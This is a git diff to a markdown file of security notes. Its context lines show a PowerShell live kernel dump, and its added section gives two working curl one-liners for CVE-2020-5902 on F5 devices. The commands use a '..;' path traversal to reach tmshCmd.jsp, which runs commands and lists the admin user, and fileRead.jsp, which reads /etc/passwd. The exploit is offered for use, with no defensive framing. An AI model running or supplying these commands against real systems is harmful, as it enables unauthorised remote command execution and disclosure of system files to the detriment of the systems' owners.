@@ -1,4 +1,4 @@
-# notes
+# notes 
 
 ### @joevennix writes:
 
@@ -75,3 +75,13 @@ Live kernel dump with PowerShell one-liner :sunglasses:
 $ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage
 Invoke-CimMethod -InputObject $ss -MethodName "GetDiagnosticInfo" -Arguments @{DestinationPath="C:\dmp"; IncludeLiveDump=$true}
 ````
+
+### @x4ce spills the beans on cve-2020-5902 :neckbeard:
+
+First RCE: 
+
+````curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'````
+
+then arbitrary read File: 
+
+````curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'````
